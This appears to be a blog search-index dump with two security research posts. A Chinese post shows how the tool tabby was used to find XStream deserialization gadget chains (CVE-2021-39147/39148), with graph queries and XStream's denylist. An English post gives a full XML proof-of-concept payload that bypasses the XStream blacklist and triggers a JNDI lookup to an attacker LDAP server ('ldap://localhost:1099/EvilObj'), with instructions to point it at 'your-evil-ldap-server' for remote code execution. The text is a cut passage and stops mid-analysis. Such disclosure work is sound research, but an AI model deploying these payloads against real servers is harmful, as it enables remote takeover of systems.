\u53ef\u80fd \u53ef\u80fd\u6027 \u7684 \uff0c \u4f46\u662f \u4f30\u8ba1 \u6ca1 \u529e\u6cd5 \u50cf \u73b0\u5728 \u8fd9\u6837 \u80fd \u9020\u6210 \u90a3\u4e48 \u5927 \u7684 \u5371\u5bb3 \u4e86 \u5427 \u3002   # 6   \u603b\u7ed3   \u672c\u6587 \u8bb2\u8ff0 \u4e86 \u6211 \u662f \u5982\u4f55 \u901a\u8fc7   tabby   \u6765 \u6361\u6f0f \u5229\u7528 \u94fe \u7684 \uff0c \u8fd9\u91cc \u6b22\u8fce \u5e08\u5085 \u4eec \u7ed9   tabby   \u63d0   pr   \u6216   issue \u3002   \u53e6\u5916 \uff0c \u8fd9\u91cc \u8fd8\u6709 \u4e00\u4ef6 \u8da3\u4e8b \uff0c \u7531\u4e8e \u56fd\u5185 \u8fc7\u4e8e \u79ef\u6781 \u63d0\u4ea4 \u5229\u7528 \u94fe \uff0c XStream   \u5b98\u65b9 \u65e0\u5948 \u4e4b\u4e0b \u9ed8\u8ba4 \u5f00\u542f \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u540e\u7eed \u53ef\u80fd \u7684 \u7ed5\u8fc7 \u3002 \u55ef \uff0c \u624b\u52a8 \u72d7\u5934 \u3002","title":"\u5982\u4f55 \u9ad8\u6548 \u5730 \u6361\u6f0f \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f"},{"location":"blog/2021/how_to_find_gadget_chains_2/#1","text":"\u4e4b\u524d \u5728 \u6587\u7ae0   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6316\u6398   Java   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe   \u4e2d \u63d0\u5230 \u4e86 \u6211 \u662f \u5982\u4f55 \u9ad8\u6548 \u6316\u6398 \u5229\u7528 \u94fe \u7684 \uff0c \u8fd9 \u5176\u4e2d \u63d0\u5230 \u4e86 \u5de5\u5177   tabby   \u3002   \u76ee\u524d \uff0c tabby   \u5f00\u6e90 \u4e5f \u6709 \u4e00\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u4e00\u6bb5\u65f6\u95f4 \u4e86 \uff0c \u8fd9 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u91cc \u6709 \u4e0d\u5c11 \u5c0f\u4f19 \u4f19\u4f34 \u5c0f\u4f19\u4f34 \u95ee \u6211 \u5982\u4f55 \u5728 \u5b9e\u9645 \u73af\u5883 \u4e2d \u66f4\u597d \u5730 \u4f7f\u7528 \u5b83 \uff1f   \u4e3a\u6b64 \uff0c \u672c\u6587 \u5c06 \u4ecb\u7ecd \u6211 \u662f \u5982\u4f55 \u5229\u7528   tabby   \u6361\u6f0f   XStream   CVE - 2021 - 39147   &&   CVE - 2021 - 39148   \u3002","title":"# 1   \u524d\u8a00"},{"location":"blog/2021/how_to_find_gadget_chains_2/#2","text":"\u8ddf \u4e4b\u524d \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u63d0\u5230 \u7684 \u4e00\u6837 \uff0c \u6211\u4eec \u5148\u5bf9   JDK   \u751f\u6210 \u4ee3\u7801 \u5c5e\u6027 \u56fe   #   \u751f\u6210 \u56fe \u7f13\u5b58 \u6587\u4ef6   java   - Xmx8g   - jar   build / libs / tabby - 1.1 . 0 - RELEASE . jar   -- isJDKOnly   #   \u5bfc\u5165 Neo4j \u56fe \u6570\u636e   java   - Xmx8g   - jar   build / libs / tabby - 1.1 . 0 - RELEASE . jar   -- isSaveOnly","title":"# 2   \u6750\u6599 \u51c6\u5907"},{"location":"blog/2021/how_to_find_gadget_chains_2/#3","text":"XStream   \u81ea   1.4 . 16   \u7248\u672c \u7684 \u4fee\u590d \u4e4b\u540e \uff0c \u6709 \u5e08\u5085 \u5728   TSRC   \u63d0\u4ea4 \u4e86   CVE - 2021 - 29505   ( PS :   TSRC   yyds )   \u8be5\u94fe \u8ddf \u4e4b\u524d \u6211\u4eec \u5728   1.4 . 15   \u7248\u672c \u65f6\u5019 \u6316 \u7684 \u5229\u7528 \u94fe \u90fd \u4e0d \u592a \u4e00\u6837 \uff0c \u5b83 \u91cd\u65b0 \u627e\u5230 \u4e86 \u4e00\u4e2a \u65b0 \u7684 \u89e6\u53d1   toString   \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u6761 \u94fe \u4e4b\u524d \u5e94\u8be5 \u6709 \u5e08\u5085 \u5206\u6790 \u8fc7 \u4e86 \uff0c \u5c31 \u4e0d \u7ec6\u8bf4 \u4e86 \uff0c \u8fd9\u91cc \u76f4\u63a5 \u8d34 \u4e00\u4e0b \u8c03\u7528 \u94fe \u3002   javax . naming . ldap . Rdn $ RdnEntry # compareTo   com . sun . org . apache . xpath . internal . objects . XString # equal   com . sun . xml . internal . ws . api . message . Packet # toString   com . sun . xml . internal . ws . message . saaj . SAAJMessage # copy   com . sun . xml . internal . ws . message . saaj . SAAJMessage # getAttachments   com . sun . xml . internal . ws . message . saaj . SAAJMessage $ SAAJAttachmentSet # < init >   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # getAttachments   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # initializeAllAttachments   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # getCount   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parse   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # getAttachments   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # makeProgress   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # hasNext   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # findNextCert   com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl # nextElement   com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl # findNextMatch   com . sun . jndi . rmi . registry . BindingEnumeration # next   sun . rmi . registry . RegistryImpl _ Stub # lookup   \u8fd9\u91cc \u63a5\u8fc7   toString   \u51fd\u6570 \u7684 \u662f   com . sun . xml . internal . ws . api . message . Packet   \uff0c \u5e76\u4e14 \u6700\u540e \u4ee5   com . sun . jndi . rmi . registry . BindingEnumeration # next   \u89e6\u53d1   lookup   \u51fd\u6570   \u8fd9\u91cc \u7ea2 \u6846\u6846 \u7684 \u5730\u65b9   ctx   \u88ab \u8bbe\u7f6e \u4e3a   sun . rmi . registry . RegistryImpl _ Stub   \u6765 \u5bf9\u5916 \u53d1\u8d77   RMI   \u8fde\u63a5 \u3002   \u8fd9\u91cc \u53e6\u5916 \u8bf4 \u4e00\u4e0b \uff0c \u5176\u5b9e   CVE - 2021 - 29505   \u7684 \u5229\u7528 \u94fe \u53ef\u4ee5 \u7b80\u5316 \u4e3a   sun . rmi . registry . RegistryImpl _ Stub # readObject   sun . rmi . server . UnicastRef # readExternal   #   trigger   rmi   connect   \u6709 \u5174\u8da3 \u7684 \u5c0f\u4f19 \u4f19\u4f34 \u5c0f\u4f19\u4f34 \u53ef\u4ee5 \u770b   RMI   \u7ed5\u8fc7 \u76f8\u5173 \u7684 \u6587\u7ae0 \uff0c \u9664\u4e86   RegistryImpl _ Stub \uff0c \u53e6\u5916 \u8fd8\u6709   link   \u56de\u5230 \u4e3b\u9898 \uff0c \u901a\u8fc7   29505   \u8fd9\u6761 \u94fe \u6211\u4eec \u53ef\u4ee5 \u5bf9\u5916 \u53d1\u8d77   RMI   \u8fde\u63a5 \uff0c \u5e76\u4e14 \u4ed6 \u662f \u5b8c\u5168 \u7ed5\u8fc7   16   \u7248\u672c \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u3002   \u4e3a\u6b64 \uff0c XStream   \u7684 \u5b98\u65b9 \u51fa \u4e86   17   \u7248\u672c \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u8865\u4e01 \uff0c \u8fd9\u91cc \u6765\u770b \u4e00\u4e0b   17   \u7248\u672c \u4e0b \u6240\u6709 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5b57\u7b26 \u5bf9\u8c61   this   .   denyTypes   (   new   String   [ ]   {   \" java . beans . EventHandler \"   ,   \" java . lang . ProcessBuilder \"   ,   \" javax . imageio . ImageIO $ ContainsFilter \"   ,   \" jdk . nashorn . internal . objects . NativeString \"   ,   \" com . sun . corba . se . impl . activation . ServerTableEntry \"   ,   \" com . sun . tools . javac . processing . JavacProcessingEnvironment $ NameProcessIterator \"   ,   \" sun . awt . datatransfer . DataTransferer $ IndexOrderComparator \"   ,   \" sun . swing . SwingLazyValue \"   } ) ;   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6b63\u5219   GETTER _ SETTER _ REFLECTION   =   Pattern   .   compile   (   \" . * \\ \\ $ GetterSetterReflection \"   ) ;   PRIVILEGED _ GETTER   =   Pattern   .   compile   (   \" . * \\ \\ $ PrivilegedGetter \"   ) ;   LAZY _ ENUMERATORS   =   Pattern   .   compile   (   \" . * \\ \\ . Lazy ( ? : Search ) ? Enumeration . * \"   ) ;   LAZY _ ITERATORS   =   Pattern   .   compile   (   \" . * \\ \\ $ LazyIterator \"   ) ;   JAXWS _ ITERATORS   =   Pattern   .   compile   (   \" . * \\ \\ $ ServiceNameIterator \"   ) ;   JAVAFX _ OBSERVABLE _ LIST __   =   Pattern   .   compile   (   \" javafx \\ \\ . collections \\ \\ . ObservableList \\ \\ $ . * \"   ) ;   JAVAX _ CRYPTO   =   Pattern   .   compile   (   \" javax \\ \\ . crypto \\ \\ .. * \"   ) ;   JAVA _ RMI   =   Pattern   .   compile   (   \" ( ? : java | sun ) \\ \\ . rmi \\ \\ .. * \"   ) ;   BCEL _ CL   =   Pattern   .   compile   (   \" . * \\ \\ . bcel \\ \\ .. * \\ \\ . util \\ \\ . ClassLoader \"   ) ;   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7ee7\u627f \u5bf9\u8c61   this   .   denyTypeHierarchy   (   InputStream   .   class   ) ;   this   .   denyTypeHierarchyDynamically   (   \" java . nio . channels . Channel \"   ) ;   this   .   denyTypeHierarchyDynamically   (   \" javax . activation . DataSource \"   ) ;   this   .   denyTypeHierarchyDynamically   (   \" javax . sql . rowset . BaseRowSet \"   ) ;   \u4ece \u4e0a\u9762 \u5217\u4e3e \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053   17   \u7248\u672c \u7684 \u8865\u4e01 \u5bf9   29505   \u8fd9\u6761 \u94fe \u7684 \u51e0\u4e2a \u5bf9\u8c61 \u8fdb\u884c \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5904\u7406 \u3002   Pattern   .   compile   (   \" ( ? : java | sun ) \\ \\ . rmi \\ \\ .. * \"   ) ;   = =   \u62c9\u9ed1   = = >   sun   .   rmi   .   registry   .   RegistryImpl _ Stub   ,   sun   .   rmi   .   server   .   UnicastRef   Pattern   .   compile   (   \" . * \\ \\ . Lazy ( ? : Search ) ? Enumeration . * \"   ) ;   = =   \u62c9\u9ed1   = = >   com   .   sun   .   jndi   .   toolkit   .   dir   .   LazySearchEnumerationImpl   \u5230 \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u53d1\u73b0 \uff0c \u5bf9\u4e8e   29505   \u8fd9 \u6761 \u5229\u7528 \u94fe \uff0c \u5982\u4e0b \u90e8\u5206 \u5229\u7528 \u94fe \u4ecd\u7136 \u662f \u53ef\u7528 \u7684   javax . naming . ldap . Rdn $ RdnEntry # compareTo   com . sun . org . apache . xpath . internal . objects . XString # equal   com . sun . xml . internal . ws . api . message . Packet # toString   com . sun . xml . internal . ws . message . saaj . SAAJMessage # copy   com . sun . xml . internal . ws . message . saaj . SAAJMessage # getAttachments   com . sun . xml . internal . ws . message . saaj . SAAJMessage $ SAAJAttachmentSet # < init >   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # getAttachments   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # initializeAllAttachments   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # getCount   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parse   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # getAttachments   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # makeProgress   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # hasNext   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # findNextCert   \u5982\u679c \u80fd \u627e\u5230 \u4ece   findNextCert   \u51fd\u6570 \u5f00\u59cb \u7684 \u5176\u4ed6 \u7aef\u70b9 \uff0c \u6211\u4eec \u4ecd\u7136 \u80fd \u5bf9   17   \u7248\u672c \u7684 \u8865\u4e01 \u8fdb\u884c \u7ed5\u8fc7 \u3002   \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff0c \u5fc5\u7136 \u5b58\u5728 \u4e00\u4e9b \u5176\u4ed6 \u7684 \u7aef\u70b9 \uff0c \u4f46\u662f \u4eba\u5de5 \u53bb \u6316\u6398 \u4f1a \u7279\u522b \u8017\u65f6 \uff0c \u90a3\u4e48 \u4e3a\u4e86 \u9ad8\u6548 \u6361\u6f0f \uff0c \u6211\u4eec \u5f53\u7136 \u4e0d\u80fd \u4eba\u5de5 \u53bb \u505a \u8fd9\u4ef6 \u4e8b \u3002 \u8fd9\u91cc \u6211\u4eec \u7684   tabby   \u5c31\u8981 \u767b\u573a \u4e86 \u3002","title":"# 3   \u80cc\u666f \u4ecb\u7ecd"},{"location":"blog/2021/how_to_find_gadget_chains_2/#4","text":"\u8fd9\u91cc \u6211\u4eec \u5148 \u6765 \u5206\u6790 \u4e00\u4e0b   findNextCert   \u51fd\u6570   \u4ece \u8fd9\u91cc \u770b \uff0c \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u7c7b \u5c5e\u6027   aliases   \u548c   keyStore   \u6765 \u8fdb\u884c \u540e\u7eed \u5229\u7528 \u94fe \u7684 \u6316\u6398 \u3002   \u8fd9\u91cc \u4ee5   aliases   \u4e3e\u4f8b \uff0c \u4e4b\u524d   29505   \u5229\u7528 \u94fe \u5c31\u662f \u4f9d\u9760   LazySearchEnumerationImpl # nextElement   \u5f00\u59cb \u627e\u5230 \u7684   rmi   \u7684   sink   \u51fd\u6570 \u3002 \u90a3\u4e48 \uff0c \u6211\u4eec \u73b0\u5728 \u91cd\u65b0 \u627e \u4e00\u4e2a \u65b0 \u7684 \uff0c \u5c31 \u9700\u8981 \u6ee1\u8db3 \u5982\u4e0b \u6761\u4ef6 \uff1a   \u5bf9\u8c61 \u5b9e\u73b0 \u4e86   java . util . Enumeration   \u63a5\u53e3   \u4ece \u8be5 \u5bf9\u8c61 \u7684   nextElement   \u51fd\u6570 \u5f00\u59cb \uff0c \u6700\u7ec8 \u80fd \u5230\u8fbe \u4e00\u4e2a \u89e6\u53d1 \u6076\u610f \u884c\u4e3a \u7684   sink   \u51fd\u6570   \u4ece   nextElement   \u51fd\u6570 \u5f00\u59cb \u5230   sink   \u51fd\u6570 \uff0c \u8def\u5f84 \u4e0a \u4e0d\u80fd \u51fa\u73b0 \u524d\u9762 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6d89\u53ca \u7684 \u5bf9\u8c61   \u5982\u679c \u80fd \u6ee1\u8db3 \u4e0a\u8ff0 \u6761\u4ef6 \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u6316 \u5230 \u4e86 \u80fd \u7ed5\u8fc7   17   \u7248\u672c \u8865\u4e01 \u7684 \u65b0 \u5229\u7528 \u94fe \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u5de5\u4f5c \u5c31 \u4ea4\u7ed9   tabby   \u6765 \u505a \u4e86 \u3002   \u9996\u5148 \uff0c \u6211\u4eec \u9700\u8981 \u6839\u636e \u4e0a\u8ff0 \u6839\u636e\u4e0a\u8ff0 \u7684 \u6761\u4ef6 \uff0c \u63cf\u8ff0 \u51fa \u5177\u4f53 \u7684 \u67e5\u8be2 \u8bed\u53e5 \u3002 \u5148 \u6765 \u9650\u5236 \u4e00\u4e0b   source   \u51fd\u6570   match   (   source   :   Method   {   NAME   :   \" nextElement \"   } )   < - [   :   HAS   ] -   (   cls   :   Class   )   -   [   :   INTERFACE   |   EXTENDS   *   ]   -   > (   cls1   :   Class   {   NAME   :   \" java . util . Enumeration \"   } )   match   (   source   )   - [   :   CALL   ] - >   (   m1   :   Method   )   source   \u51fd\u6570 \u4e3a   nextElement \uff0c \u5e76\u4e14 \u5b9e\u73b0 \u4e86   java . util . Enumeration   \u63a5\u53e3   \u518d \u6765 \u9650\u5236   sink   \u51fd\u6570   match   (   sink   :   Method   {   IS _ SINK   :   true   ,   VUL   :   \" JNDI \"   } )   \u8fd9\u91cc \u5c31 \u9650\u5236 \u5f53\u524d   sink   \u51fd\u6570 \u6700\u7ec8 \u80fd \u8fbe\u6210   JNDI   \u6ce8\u5165 \u7684 \u6548\u679c \u3002   \u6700\u540e \uff0c \u6211\u4eec \u518d \u6765 \u9650\u5236 \u4e00\u4e0b \u8def\u5f84 \u4e0a \u4e0d\u80fd \u51fa\u73b0 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5bf9\u8c61   call   apoc   .   algo   .   allSimplePaths   (   sink   ,   m1   ,   \" < CALL | ALIAS \"   ,   8   )   yield   path   where   none   (   n   in   nodes   (   path   )   where   n   .   CLASSNAME   in   [   \" java . beans . EventHandler \"   ,   \" java . lang . ProcessBuilder \"   ,   \" javax . imageio . ImageIO $ ContainsFilter \"   ,   \" jdk . nashorn . internal . objects . NativeString \"   ,   \" com . sun . corba . se . impl . activation . ServerTableEntry \"   ,   \" com . sun . tools . javac . processing . JavacProcessingEnvironment $ NameProcessIterator \"   ,   \" sun . awt . datatransfer . DataTransferer $ IndexOrderComparator \"   ,   \" sun . swing . SwingLazyValue \"   ,   \" com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl \"   ,   \" sun . rmi . registry . RegistryImpl _ Stub \"   ,   \" com . sun . jndi . dns . BindingEnumeration \"   ,   \" com . sun . jndi . cosnaming . CNBindingEnumeration \"   ,   \" com . sun . jndi . toolkit . dir . HierMemDirCtx $ FlatBindings \"   ,   \" com . sun . jndi . ldap . LdapReferralException \"   ]   )   return   source   ,   path   limit   50   \u8fd9\u91cc \u7b2c   9   \u884c\u4e0a \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u662f \u540e\u7eed \u4eba\u5de5 \u6392\u9664 \u540e \u6dfb\u52a0 \u7684 \uff08 \u4e0d \u53ef\u884c \u6216 \u6784\u9020 \u8fc7\u4e8e \u9ebb\u70e6 \uff09 \u3002   \u628a \u4e0a\u9762 \u7684   3   \u4e2a \u90e8\u5206 \u5408 \u8d77\u6765 \u540e \u67e5\u8be2 \u6700\u7ec8 \u80fd \u5f97\u5230 \u5982\u4e0b   3   \u6761 \u5229\u7528 \u94fe \u3002   \u5206\u522b \u662f \u4e00\u4e0b \u5bf9\u8c61   com . sun . jndi . ldap . LdapSearchEnumeration   \u5bf9\u5e94   CVE - 2021 - 39147   com . sun . jndi . ldap . LdapBindingEnumeration   \u5bf9\u5e94   CVE - 2021 - 39145   \uff08 CVE - 2021 - 39151   \u7528 \u7684 \u4e5f \u662f \u8fd9\u4e2a \uff09   com . sun . jndi . toolkit . dir . ContextEnumerator   \u5bf9\u5e94   CVE - 2021 - 39148   \u4ed6\u4eec \u5206\u522b \u6700\u7ec8 \u5c06 \u8c03\u7528   sink   \u51fd\u6570   NamingManager . getContext   \u548c   DirectoryManager . getObjectInstance   \u8fd9 \u4e24\u4e2a   sink   \u51fd\u6570 \u662f   JNDI   \u5904\u7406   Reference   \u7684 \u51fd\u6570 \uff0c \u901a\u8fc7 \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u53ef\u4ee5 \u5728 \u7279\u5b9a   JDK   \u7248\u672c \u4e0b \u8f7d\u5165 \u5916\u90e8 \u7684 \u4efb\u610f \u4ee3\u7801 \uff0c \u4e5f \u53ef\u4ee5 \u5728   tomcat   \u4e0b \u6267\u884c   el   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u5177\u4f53 \u53ef\u4ee5 \u770b   JNDI   \u5173\u4e8e   Reference   \u7684 \u77e5\u8bc6 \u3002","title":"# 4   \u9ad8\u6548 \u6361\u6f0f"},{"location":"blog/2021/how_to_find_gadget_chains_2/#5","text":"XStream   1.4 . 18   \u7248\u672c \u5f00\u59cb \u5c06 \u9ed8\u8ba4 \u5f00\u542f \u540d\u5355 \u767d\u540d\u5355 \u6a21\u5f0f \uff0c \u53ea \u5141\u8bb8 \u51e0\u4e2a \u57fa\u7840 \u7c7b\u578b \u7684 \u8fdb\u884c \u8fd8\u539f \u3002   \u4f46\u662f \u8fd9\u91cc \u60f3 \u4e0d \u660e\u767d \u7684 \u662f \u4e3a\u4f55 \u5c06 \u4e4b\u524d \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5904\u7406 \u76f4\u63a5 \u5220\u9664 \u4e86 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u672a\u6765   XStream   \u7684 \u5b89\u5168 \u5b89\u5168\u6027 \u5c06 \u4f9d\u9760 \u5f00\u53d1 \u5f00\u53d1\u8005 \u5bf9\u4e8e \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u98ce\u9669 \u7684 \u8ba4\u8bc6 \u3002   \u6b64\u5916 \uff0c \u540e\u7eed \u7248\u672c \u7ed5\u8fc7 \u9ed8\u8ba4 \u540d\u5355 \u767d\u540d\u5355 \u8fd8\u662f \u5b58\u5728 \u53ef\u80fd \u53ef\u80fd\u6027 \u7684 \uff0c \u4f46\u662f \u4f30\u8ba1 \u6ca1 \u529e\u6cd5 \u50cf \u73b0\u5728 \u8fd9\u6837 \u80fd \u9020\u6210 \u90a3\u4e48 \u5927 \u7684 \u5371\u5bb3 \u4e86 \u5427 \u3002","title":"# 5   \u8865\u4e01 \u4fee\u590d"},{"location":"blog/2021/how_to_find_gadget_chains_2/#6","text":"\u672c\u6587 \u8bb2\u8ff0 \u4e86 \u6211 \u662f \u5982\u4f55 \u901a\u8fc7   tabby   \u6765 \u6361\u6f0f \u5229\u7528 \u94fe \u7684 \uff0c \u8fd9\u91cc \u6b22\u8fce \u5e08\u5085 \u4eec \u7ed9   tabby   \u63d0   pr   \u6216   issue \u3002   \u53e6\u5916 \uff0c \u8fd9\u91cc \u8fd8\u6709 \u4e00\u4ef6 \u8da3\u4e8b \uff0c \u7531\u4e8e \u56fd\u5185 \u8fc7\u4e8e \u79ef\u6781 \u63d0\u4ea4 \u5229\u7528 \u94fe \uff0c XStream   \u5b98\u65b9 \u65e0\u5948 \u4e4b\u4e0b \u9ed8\u8ba4 \u5f00\u542f \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u540e\u7eed \u53ef\u80fd \u7684 \u7ed5\u8fc7 \u3002 \u55ef \uff0c \u624b\u52a8 \u72d7\u5934 \u3002","title":"# 6   \u603b\u7ed3"},{"location":"blog/2021/xstream_blacklist_bypass/","tags":["java"],"text":"# 1   Gadget   Overview   Recently ,   I   found   a   new   deserialzation   gadget   which   can   bypass   the   latest   version   of   XStream .   This   gadget   use   the   JDK   to   construct   the   gadget   chain .   I   had   tested   the   gadget   chain   to   RCE   ( remote   code   execute )   with   the   version   of   JDK8   ( 8u162 ) .   I   think   other   version   of   JDK   also   could   trigger   this   vulnerablity   to   the   RCE .   Let ' s   look   at   this   gadget ,   and   the   detail   is   in   part   # 3 .   TreeSet . putAll   javax . naming . ldap . Rdn $ RdnEntry . compareTo   com . sun . org . apache . xpath . internal . objects . XString . equal   javax . swing . MultiUIDefaults . toString   UIDefaults . get   UIDefaults . getFromHashTable   UIDefaults $ LazyValue . createValue   SwingLazyValue . createValue   javax . naming . InitialContext . doLookup ( )   # 2   Poc   < sorted - set >   < javax . naming . ldap . Rdn _- RdnEntry >   < type >   ysomap   < / type >   < value   class =   \" javax . swing . MultiUIDefaults \"   serialization =   \" custom \"   >   < unserializable - parents / >   < hashtable >   < default >   < loadFactor >   0.75   < / loadFactor >   < threshold >   525   < / threshold >   < / default >   < int >   700   < / int >   < int >   0   < / int >   < / hashtable >   < javax . swing . UIDefaults >   < default >   < defaultLocale >   zh _ CN   < / defaultLocale >   < resourceCache / >   < / default >   < / javax . swing . UIDefaults >   < javax . swing . MultiUIDefaults >   < default >   < tables >   < javax . swing . UIDefaults   serialization =   \" custom \"   >   < unserializable - parents / >   < hashtable >   < default >   < loadFactor >   0.75   < / loadFactor >   < threshold >   525   < / threshold >   < / default >   < int >   700   < / int >   < int >   1   < / int >   < string >   lazyValue   < / string >   < sun . swing . SwingLazyValue >   < className >   javax . naming . InitialContext   < / className >   < methodName >   doLookup   < / methodName >   < args >   < string >   ldap : / / localhost : 1099 / EvilObj   < / string >   < / args >   < / sun . swing . SwingLazyValue >   < / hashtable >   < javax . swing . UIDefaults >   < default >   < defaultLocale   reference =   \" .. / .. / .. / .. / .. / .. / .. / javax . swing . UIDefaults / default / defaultLocale \"   / >   < resourceCache / >   < / default >   < / javax . swing . UIDefaults >   < / javax . swing . UIDefaults >   < / tables >   < / default >   < / javax . swing . MultiUIDefaults >   < / value >   < / javax . naming . ldap . Rdn _- RdnEntry >   < javax . naming . ldap . Rdn _- RdnEntry >   < type >   ysomap   < / type >   < value   class =   \" com . sun . org . apache . xpath . internal . objects . XString \"   >   < m __ obj   class =   \" string \"   >   test   < / m __ obj >   < / value >   < / javax . naming . ldap . Rdn _- RdnEntry >   < / sorted - set >   when   you   try   to   reproduce   this   vulnerablity ,   you   should   change   the   line   37 ' s   content .   For   example ,   changing   the   ldap : / / localhost : 1099 / EvilObj   to   ldap : / / your - evil - ldap - server : port / Namespace   # 3   Analysis   First   of   all ,   XStream   can   deserialize   a   tag   with   < sorted - set >   using   the   TreeSet / TreeMapConverter .   And   the   recover   process   will   call   some   object ' s   compareTo   function   and   not   in   the   default   blacklist .   So   I   try   to   find   a   Object   with   compareTo   function .   Using   javax . naming . ldap . Rdn $ RdnEntry . compareTo ( )   public   int   compareTo   (   RdnEntry   that   )   {   int   diff   =   type   .   compareToIgnoreCase   (   that   .   type   ) ;   if   (   diff   ! =   0   )   {   return   diff   ;   }   if   (   value   .   equals   (   that   .   value   ) )   {   / /   try   shortcut   return   0   ;   }   return   getValueComparable   ( ) .   compareTo   (   that   .   getValueComparable   ( ) ) ;   }   The   field   value   is   a   Object   type ,   so   we   can   use   any   type   of   class   to   transfer   the   chain .   Using   com . sun . org . apache . xpath . internal . objects . XString . equal ( )   public   boolean   equals   (   Object   obj2   )   {   if   (   null   = =   obj2   )   return   false   ;   / /   In   order   to   handle   the   ' all '   semantics   of   / /   nodeset   comparisons ,   we   always   call   the   / /   nodeset   function .   else   if   (   obj2   instanceof   XNodeSet   )   return   obj2   .   equals   (   this   ) ;   else   if   (   obj2   instanceof   XNumber   )   return   obj2   .   equals   (   this   ) ;   else   return   str   ( ) .   equals   (   obj2   .   toString   ( ) ) ;   }   The   line   15   call   the   obj2 . toString   function ,   and   not   check   the   obj2   ' s   type .   So   we   can   find   a   anytype   class   with   toString   function .   Using   javax . swing . MultiUIDefaults . toString ( )   public   synchronized   String   toString   ( )   {   StringBuffer   buf   =   new   StringBuffer   ( ) ;   buf   .   append   (   \" { \"   ) ;   Enumeration   keys   =   keys   ( ) ;   while   (   keys   .   hasMoreElements   ( ) )   {   Object   key   =   keys   .   nextElement   ( ) ;   buf   .   append   (   key   +   \" = \"   +   get   (   key   )   +   \" ,   \"   ) ;   }   int   length   =   buf   .   length   ( ) ;   if   (   length   >   1   )   {   buf   .   delete   (   length   -   2   ,   length   ) ;   }   buf   .   append   (   \" } \"   ) ;   return   buf   .   toString   ( ) ;   }   The   line   7   trigger   the   get   function .   public   Object   get   (   Object   key   )   {   Object   value   =   super   .   get   (   key   ) ;   if   (   value   ! =   null   )   {   return   value   ;   }   for   (   UIDefaults   table   :   tables   )   {   value   =   (   table   ! =   null   )   ?   table   .   get   (   key   )   :   null   ;   if   (   value   ! =   null   )   {   return   value   ;   }   }   return   null   ;   }   And   on   get   function ,   the   line   9   call   the   javax . swing . UIDefaults . get ( )   public   Object   get   (   Object   key   )   {   Object   value   =   getFromHashtable   (   key   ) ;   return   (   value   ! =   null   )   ?   value   :   getFromResourceBundle   (   key   ,   null   ) ;   }   Next ,   the   line   2   trigger   the   getFromHashtable   function .   private   Object   getFromHashtable   (   final   Object   key   )   {   / /   ...   synchronized   (   this   )   {   value   =   super   .   get   (   key   ) ;   / /   ...   if   (   value   instanceof   LazyValue   )   {   try   {   / *   If   an   exception   is   thrown   we ' ll   just   put   the   LazyValue   *   back   in   the   table .   * /   value   =   ( (   